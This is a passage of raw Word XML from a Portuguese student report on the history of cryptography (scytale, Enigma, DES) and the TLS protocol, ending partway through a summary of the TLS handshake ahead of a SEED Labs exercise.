    <w:p w14:paraId="465D0D7A" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
        <w:t>A origem a palavra criptografia vem do grego, “</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>kryptós</w:t>
      </w:r>
      <w:r>
        <w:t>” (oculto, escondido) e “</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>gráphein</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">” (escrever), o que significa literalmente, </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>escrita oculta</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD36656" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O objetivo é </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ocultar a mensagem</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> de tal modo que apenas o </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>destinatário tenha a capacidade de lê-la</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, protegendo o seu conteúdo durante o percurso. Os primeiros registos de criptografia remontam ao </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Egito antigo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e o </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>império Sumério</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, com </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>hieróglifos modificados para ocultar as mensagens</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C033C6" w14:textId="23418A2E" w:rsidR="00392CCA" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="776FE5C9" wp14:editId="552D5A6E">
            <wp:extent cx="2269297" cy="1463675"/>
            <wp:effectExtent l="133350" t="114300" r="131445" b="155575"/>
            <wp:docPr id="1647405545" name="Imagem 23" descr="Hieroglyph | Definition, History,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ieroglyph | Definition, History, &amp; Facts | Britanni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5428" cy="1467630"/>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A8B57" w14:textId="2B35F4C0" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A engenhosidade humana desenvolveu </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>métodos para facilitar a encriptação</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, o primeiro dispositivo mecânico de criptografia em que se tem conhecimento é a </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Citala</w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, um bastão de madeira em que uma tira de couro era enrolada, a mensagem verdadeira só era revelada </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>se o diâmetro do bastão fosse o correto</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24723BF8" w14:textId="5B75D477" w:rsidR="00392CCA" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12675682" wp14:editId="6573A330">
            <wp:extent cx="2362200" cy="1349829"/>
            <wp:effectExtent l="133350" t="114300" r="133350" b="155575"/>
            <wp:docPr id="2144803442" name="Imagem 24" descr="Cítala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ítala – Wikipédia, a enciclopédia liv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7641" cy="1352938"/>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BA9454" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Muitos séculos depois, com o surgimento da </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>mecânica e eletrônica</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, dispositivos muito mais complexos foram desenvolvidos, como a </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">máquina </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Enigma</w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, utilizada pela </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Alemanha</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> durante a </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>segunda guerra mundial</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, que criptografava mensagens. Sua necessidade se dava porque as mensagens eram </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>transmitidas por rádio</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, o que possibilitava a </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>intercetação pelos aliados</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Apesar da grande complexidade da </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>máquina</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="00392CCA" w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>nigma</w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, o seu código foi decifrado, o que </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>contribuiu significativamente na vitória dos Aliados na guerra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3043DF" w14:textId="133A0356" w:rsidR="004253CC" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D6E8CA3" wp14:editId="037FB41C">
            <wp:extent cx="2028229" cy="2705100"/>
            <wp:effectExtent l="133350" t="114300" r="124460" b="171450"/>
            <wp:docPr id="1982900754" name="Imagem 25" descr="Cryptanalysis of the Enigm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Cryptanalysis of the Enigm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290" cy="2706515"/>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A8B5D9" w14:textId="14A95573" w:rsidR="00392CCA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t>Somente com o desenvolvimento dos computadores é que a criptografia ganhou uma complexidade realmente grande.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3648747B" w14:textId="5CE68BC4" w:rsidR="004253CC" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6424E9" w14:textId="0D3C49C4" w:rsidR="004253CC" w:rsidRPr="00392CCA" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc213874694"/>
      <w:bookmarkStart w:id="5" w:name="_Toc213881891"/>
      <w:r w:rsidRPr="00392CCA">
        <w:lastRenderedPageBreak/>
        <w:t>DES</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="7B1E626B" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Com a digitalização de </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>diversos serviços do governo americano</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>início</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> da década de </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1970</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, houve a necessidade de </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>proteger dados públicos sensíveis</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, por isso uma encriptação segura tornou-se necessária. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D33929" w14:textId="7B2DDBFD" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vários algoritmos de criptografia</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> foram desenvolvidos para tentar </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>suprir os rigorosos critérios do governo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, mas </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>somente em</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1974</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que um algoritmo cumpriu esses critérios. Desenvolvido pela </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>IBM</w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, o </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> então passou por 4 anos de testes públicos até que o </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Comitê de inteligência dos EUA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA">
        <w:t>concluísse que</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA" w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>algoritmo</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> poderia funcionar</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, apesar das críticas ao </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>tamanho de sua chave</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A44C50C" w14:textId="4A5C46FC" w:rsidR="004253CC" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="253C1152" wp14:editId="75FA9CFD">
            <wp:extent cx="2884268" cy="2415540"/>
            <wp:effectExtent l="133350" t="114300" r="125730" b="156210"/>
            <wp:docPr id="44984921" name="Imagem 26" descr="Data Encryption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Data Encryption Standa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2460" cy="2422401"/>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B480719" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="65450439" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="23BFFD1D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc213874695"/>
      <w:bookmarkStart w:id="7" w:name="_Toc213881892"/>
      <w:r>
        <w:t>TLS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="175E056C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0D02C971" w14:textId="4D35925F" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Transport Layer Security</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, é um </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>protocolo de segurança que protege a comunicação de dois pontos distintos em uma rede</w:t>
      </w:r>
      <w:r>
        <w:t>. Pode ser a comunicação de um cliente e um servidor, ou entre 2 servidores.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF6B949" w14:textId="402FD5D8" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">O TLS opera </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>garantindo a autenticidade</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>privacidade e integridade</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> da informação </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>trocada entre os 2 pontos da rede</w:t>
      </w:r>
      <w:r>
        <w:t>, fornecendo uma camada de segurança durante est</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> troca de mensagens. Para garantir a privacidade, o protocolo </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>utiliza algoritmos de encriptação que protegem o conteúdo da mensagem</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> durante o </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>trajeto dos dois pontos</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> impedindo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ao serem intercetadas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>as mensagens possam ser lidas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Além disso, o </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">TLS </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">também autentica os pontos na rede que querem se comunicar, através de certificados </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>digitais, que fornecem uma camada se segurança extra a respeito da identidade do servidor e cliente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A0F090" w14:textId="25B92951" w:rsidR="002E26AA" w:rsidRDefault="002E26AA" w:rsidP="002E26AA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69EDAEC3" wp14:editId="64F6E269">
            <wp:extent cx="2668612" cy="2346960"/>
            <wp:effectExtent l="133350" t="114300" r="151130" b="148590"/>
            <wp:docPr id="2115495308" name="Imagem 27" descr="Understanding Transport layer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Understanding Transport layer Secur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3828" cy="2360342"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF">
                        <a:shade val="85000"/>
                      </a:srgbClr>
                    </a:solidFill>
                    <a:ln w="889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5469F9" w14:textId="77777777" w:rsidR="002E26AA" w:rsidRDefault="002E26AA"/>
    <w:p w14:paraId="1A2EF911" w14:textId="1F8C1D6C" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">Protocolos de segurança baseados no </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> são amplamente utilizados hoje em dia, como em </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>páginas web com o protocolo HTTPS, SMTP no envio de e-mails, VPNs e etc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Todos esses protocolos utilizam o </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para a troca de mensagens e por isso seu estudo é extremamente importante no contexto de </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cibersegurança</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Neste relatório, iremos explicar seu funcionamento através de um </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>laboratório prático</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fornecido pelo </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SEED labs</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, em que </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>estudamos o seu funcionamento</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646D2CF1" w14:textId="77777777" w:rsidR="002E26AA" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">Antes de iniciarmos os exercícios no </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SEED labs</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, precisamos resumir brevemente o funcionamento do </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. O primeiro e mais importante passo é chamado de “Handshake”, pois </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>é o momento inicial onde as informações mais importantes são trocadas e a conexão é estabelecida</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1715C8F6" w14:textId="1C077055" w:rsidR="004253CC" w:rsidRDefault="002E26AA">
      <w:r>
        <w:t>O seu funcionamento é assim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CB394B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4461C75D" w14:textId="4B61FF01" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Handshake</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762A21CF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="495FF909" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>Negociação:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> trocam versões do TLS e suites de cifras suportadas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E1AB69" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49798627" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>Autenticação:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> o servidor envia seu </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>certificado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>; o cliente valida a cadeia e o nome do host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561C6A0C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B1D4413" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>Acordo de chaves:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> usam criptografia assimétrica (ex.: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>ECDHE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>) para criar chaves de sessão simétricas (com Sigilo Direto/Forward Secrecy).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC94E17" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61C5A33E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t>Confirmação:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:spacing w:val="5"/>
